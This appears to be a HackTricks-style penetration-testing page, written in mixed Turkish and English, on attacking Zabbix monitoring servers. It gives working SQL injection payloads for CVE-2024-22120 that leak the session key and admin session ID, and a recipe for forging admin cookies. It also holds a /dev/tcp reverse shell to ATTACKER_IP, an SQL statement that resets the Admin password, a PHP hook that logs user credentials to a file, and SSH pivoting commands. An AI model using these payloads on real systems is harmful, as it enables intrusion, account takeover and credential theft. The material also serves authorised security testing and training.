# Zabbix Güvenliği

{{#include ../../banners/hacktricks-training.md}}

## Genel Bakış

Zabbix, bir web UI (genellikle Apache/Nginx arkasında) ve TCP/10051 (server/trapper) üzerinde Zabbix protocol konuşan bir server bileşeni ile TCP/10050 üzerinde agent sunan bir monitoring platformudur. Sızma testleri sırasında şunlarla karşılaşabilirsiniz:

- Web UI: HTTP(S) virtual host örn. zabbix.example.tld
- Zabbix server port: 10051/tcp (JSON over a ZBXD header framing)
- Zabbix agent port: 10050/tcp

Kullanışlı çerez formatı: zbx_session, en azından sessionid, serverCheckResult, serverCheckTime ve sign içeren kompakt bir JSON objesinin Base64'idir. sign, JSON yükünün HMAC'idir.

## zbx_session cookie internals

Recent Zabbix versions compute the cookie like:

- data JSON: {"sessionid":"<32-hex>","serverCheckResult":true,"serverCheckTime":<unix_ts>}
- sign: HMAC-SHA256(key=session_key, data=JSON string of data sorted by keys and compact separators)
- Final cookie: Base64(JSON_with_sign)

Eğer global session_key ve geçerli bir admin sessionid'i kurtarabilirseniz, çevrimdışı olarak geçerli bir Admin çerezi oluşturup UI'ye kimlik doğrulaması yapabilirsiniz.

## CVE-2024-22120 — Time-based blind SQLi in Zabbix Server audit log

Affected versions (as publicly documented):

- 6.0.0–6.0.27, 6.4.0–6.4.12, 7.0.0alpha1

Vulnerability summary:

- When a Script execution is recorded into the Zabbix Server audit log, the clientip field is not sanitized and is concatenated into SQL, enabling time-based blind SQLi via the server component.
- This is exploitable by sending a crafted "command" request to the Zabbix server port 10051 with a valid low-privileged sessionid, a hostid the user can access, and a permitted scriptid.

Preconditions and discovery tips:

- sessionid: From guest/login in the web UI, decode zbx_session (Base64) to get sessionid.
- hostid: Observe via web UI requests (e.g., Monitoring → Hosts) or intercept with a proxy; common default is 10084.
- scriptid: Only scripts permitted to the current role will execute; verify by inspecting the script menu/AJAX responses. Defaults like 1 or 2 are often allowed; 3 may be denied.

### Sömürü akışı

1) clientip alanında SQLi içeren audit insert'i tetikleyin

- Connect to TCP/10051 and send a Zabbix framed message with request="command" including sid, hostid, scriptid, and clientip set to a SQL expression that will be concatenated by the server and evaluated.

Minimal message (JSON body) fields:
```json
{
"request": "command",
"sid": "<low-priv-sessionid>",
"scriptid": "1",
"clientip": "' + (SQL_PAYLOAD) + '",
"hostid": "10084"
}
```
Tam wire formatı: "ZBXD\x01" + 8-byte little-endian length + UTF-8 JSON. Bunu çerçevelemek için pwntools veya kendi socket kodunuzu kullanabilirsiniz.

2) Time-bruteforce secrets via conditional sleep

Koşullu ifadeleri kullanarak yanıt süresini ölçüp hex-encoded secrets'i karakter karakter leak edin. Pratikte işe yarayan örnekler:

- Leak global session_key from config:
```sql
(select CASE WHEN (ascii(substr((select session_key from config),{pos},1))={ord}) THEN sleep({T_TRUE}) ELSE sleep({T_FALSE}) END)
```
- Leak Admin session_id (userid=1) from sessions:
```sql
(select CASE WHEN (ascii(substr((select sessionid from sessions where userid=1 limit 1),{pos},1))={ord}) THEN sleep({T_TRUE}) ELSE sleep({T_FALSE}) END)
```
Notlar:

- charset: 32 hex karakter [0-9a-f]
- T_TRUE >> T_FALSE seçin (ör. 10 vs 1) ve deneme başına wall-clock (gerçek zaman) ölçün
- scriptid'in gerçekten kullanıcı için yetkili olduğunu doğrulayın; aksi takdirde denetim kaydı oluşturulmaz ve zamanlama çalışmaz

3) Admin cookie sahteleştirme

Aşağıdakilere sahip olduğunuzda:

- session_key: config.session_key'ten 32-hex
- admin_sessionid: userid=1 için sessions.sessionid'den 32-hex

Hesapla:

- sign = HMAC_SHA256(key=session_key, data=json.dumps({sessionid, serverCheckResult:true, serverCheckTime:now}, sort by key, compact))
- zbx_session = Base64(JSON_with_sign)

zbx_session cookie'sini bu değere ayarlayın ve Admin erişimini doğrulamak için GET /zabbix.php?action=dashboard.view yapın.

### Hazır araçlar

- Public PoC otomatikleştirir: session_key ve admin sessionid'in bruteforce'ü ve cookie sahteleştirme; pwntools ve requests gerektirir.
- Genellikle sağlanması gereken parametreler şunlardır: --ip (UI'nin FQDN'si), --port 10051, --sid (low-priv), --hostid ve isteğe bağlı olarak brute'ı atlamak için bilinen bir --admin-sid.

## RCE ile Script execution (post-Admin)

UI'de Admin erişimi ile, izlenen hostlara karşı önceden tanımlı Scripts çalıştırabilirsiniz. Eğer agents/hosts script komutlarını yerel olarak çalıştırıyorsa, bu sistemlerde kod çalıştırılması sağlar (genellikle Linux hostlarda zabbix kullanıcısı olarak):

- Hızlı kontrol: kullanıcı bağlamını doğrulamak için id çalıştırın
- Reverse shell example:
```bash
bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/443 0>&1'
```
TTY yükseltme (Linux):
```bash
script /dev/null -c bash
# background with Ctrl+Z, then on attacker terminal:
stty raw -echo; fg
reset
```
DB erişiminiz varsa, forging a cookie yerine bir alternatif olarak Admin parolasını "zabbix" için belgelenmiş bcrypt'e sıfırlayabilirsiniz:
```sql
UPDATE users SET passwd='$2a$10$ZXIvHAEP2ZM.dLXTm6uPHOMVlARXX7cqjbhM6Fn0cANzkCQBWpMrS' WHERE username='Admin';
```
## Kimlik bilgileri yakalama (login hook) (post-exploitation)

Eğer web UI sunucusunda dosya yazma mümkünse, kimlik bilgilerini yakalamak için form tabanlı giriş bölümünün çevresine /usr/share/zabbix/index.php dosyasına geçici bir loglama kod parçası ekleyebilirsiniz:
```php
// login via form
if (hasRequest('enter') && CWebUser::login(getRequest('name', ZBX_GUEST_USER), getRequest('password', ''))) {
$user = $_POST['name'] ?? '??';
$password = $_POST['password'] ?? '??';
$f = fopen('/dev/shm/creds.txt','a+'); fputs($f, "$user:$password\n"); fclose($f);
CSessionHelper::set('sessionid', CWebUser::$data['sessionid']);
}
```
Kullanıcılar normal şekilde kimlik doğrular; ardından /dev/shm/creds.txt dosyasını oku. İşin bitince hook'u kaldır.

## Pivoting to internal services

Hizmet hesabının shell'i /usr/sbin/nologin olsa bile, SSH authorized_keys girdisi eklemek ve -N -L kullanmak loopback-only servislerine (ör. CI/CD 8111'de) local port-forwarding sağlar:
```bash
ssh -i key user@host -N -L 8111:127.0.0.1:8111
```
Daha fazla tunneling deseni için bkz.: [Tunneling and Port Forwarding](../../generic-hacking/tunneling-and-port-forwarding.md).

## Operasyonel ipuçları

- Mevcut rol için scriptid'in izinli olduğunu doğrulayın (guest sınırlı bir sete sahip olabilir)
- Timing brute yavaş olabilir; kurtarılan admin sessionid'yi önbelleğe alıp yeniden kullanın
- 10051'e gönderilen JSON, ZBXD\x01 header'ı ve little-endian uzunluğu ile çerçevelenmelidir

## Referanslar

- [HTB Watcher — Zabbix CVE-2024-22120 to Admin/RCE and TeamCity root pivot](https://0xdf.gitlab.io/2025/10/09/htb-watcher.html)
- [CVE-2024-22120-RCE toolkit (PoC scripts)](https://github.com/W01fh4cker/CVE-2024-22120-RCE)

{{#include ../../banners/hacktricks-training.md}}
